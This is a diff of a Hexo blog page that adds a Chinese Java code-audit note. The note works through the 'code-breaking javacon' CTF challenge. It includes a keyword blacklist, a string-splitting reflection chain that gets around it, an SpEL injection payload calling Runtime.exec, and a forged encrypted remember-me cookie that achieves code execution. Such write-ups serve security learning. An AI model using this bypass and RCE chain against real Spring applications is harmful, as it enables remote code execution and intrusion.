@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>test | Hexo</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="test | Hexo">
+  <title>java审计笔记 | Hexo</title>
+  <meta name="keywords" content=" java ">
+  <meta name="description" content="java审计笔记 | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="关于我">
 <meta property="og:type" content="website">
@@ -343,19 +343,31 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-test" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-java审计笔记" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">test</h1>
+        <h1 class="article-title">java审计笔记</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            
+                <a  data-rel="代码审计">代码审计</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color5">java</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-30 07:57:00'>2020-01-30 07:56</time>
+        创建时间:<time class="date" title='更新时间: 2020-01-30 09:13:46'>2020-01-30 09:05</time>
         
     </div>
     <div class="article-meta">
@@ -377,7 +389,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java审计笔记"><span class="toc-text">java审计笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#反射相关概念"><span class="toc-text">反射相关概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化"><span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例分析"><span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#code-breaking-javacon"><span class="toc-text">code-breaking javacon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache"><span class="toc-text">apache</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -393,8 +405,60 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><img src="/2020/01/30/test/1580342219792.png" alt="1580342219792"></p>
+        <h1 id="java审计笔记"><a href="#java审计笔记" class="headerlink" title="java审计笔记"></a>java审计笔记</h1><h2 id="反射相关概念"><a href="#反射相关概念" class="headerlink" title="反射相关概念"></a>反射相关概念</h2><p>首先需要明白 Class 类</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>java的反序列化是通过<code>ObjectOutputStream</code>和<code>ObjectInputStream</code>两个类来实现的，同时要序列化的类必须实现<code>Serializable</code>接口</p>
+<p>与PHP类似，Java在序列化一个对象的时候会调用<code>writeObject</code>方法，在反序列化一个对象的时候会调用<code>readObject</code>方法</p>
+<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="code-breaking-javacon"><a href="#code-breaking-javacon" class="headerlink" title="code-breaking javacon"></a>code-breaking javacon</h3><p>一个spring框架写的登陆界面，用户名和密码都是admin，有一个remember me可以勾选</p>
+<p><code>application.yml</code>中有一些相关的设置</p>
+<pre><code class="yaml">keywords:
+  blacklist: 
+    - java.+lang
+    - Runtime
+    - exec.*\(
+user:
+  username: admin
+  password: admin
+  rememberMeKey: c0dehack1nghere1</code></pre>
+<p>有一个黑名单过滤了一些字符，不过可以很容易地用字符串拼接进行绕过</p>
+<p>仔细分析代码，其中有存在一处类似模板渲染的语句</p>
+<pre><code class="java">ParserContext parserContext = new TemplateParserContext();
+Expression exp = parser.parseExpression(val, parserContext);
+SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
+return exp.getValue(evaluationContext).toString();</code></pre>
+<blockquote>
+<p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p>
+</blockquote>
+<p>这一处位于<code>getAdvanceValue</code>函数中，调用它的是这里：</p>
+<pre><code class="java">@GetMapping
+public String admin(@CookieValue(value = &quot;remember-me&quot;, required = false) String rememberMeValue,
+                    HttpSession session,
+                    Model model) {
+    if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {
+        String username = userConfig.decryptRememberMe(rememberMeValue);
+        if (username != null) {
+            session.setAttribute(&quot;username&quot;, username);
+        }
+    }
 
+    Object username = session.getAttribute(&quot;username&quot;);
+    if(username == null || username.toString().equals(&quot;&quot;)) {
+        return &quot;redirect:/login&quot;;
+    }
+
+    model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));
+    return &quot;hello&quot;;
+}</code></pre>
+<p>这里相当于是admin的管理界面，首先会检查<code>rememberMeValue</code>的值，并且尝试去解密其中的用户名，同时加入到<code>session</code>中，之后执行<code>model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));</code></p>
+<p>那么这里的关键就是<code>cookie</code>中的rememberMeValue，由于我们已经知道了加密的算法和密钥(代码都是直接给的)，那么就可以通过伪造<code>rememberMeValue</code>来达到rce</p>
+<p>首先需要一条java的反射链，因为要绕过一些关键字：</p>
+<pre><code class="java">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;calc&quot;)</code></pre>
+<p>之后要将其构造成Spel表达式，就是增加一个<code>T()</code></p>
+<p>先本地测试弹一个计算器</p>
+<pre><code class="java">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;calc\&quot;})}&quot;)); //注意java的字符串必须是双引号</code></pre>
+<p>生成payload</p>
+<pre><code>bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9Gj_AWy8DB8Dxea8atf2wr8=</code></pre><p>之后登陆再替换掉cookie</p>
+<p><img src="/2020/01/30/java%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/1573973547431-1580346732870.png" alt="结果"></p>
+<h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
     </div>
@@ -407,12 +471,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>test</p>
+    <p><span class="copy-title">文章标题:</span>java审计笔记</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="John Doe">John Doe</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-01-30, 07:56:50</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-30, 07:57:00</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/30/test/" title="test">http://yoursite.com/2020/01/30/test/</a>
+    <p><span class="copy-title">发布时间:</span>2020-01-30, 09:05:39</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-30, 09:13:46</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/30/java%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/" title="java审计笔记">http://yoursite.com/2020/01/30/java%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
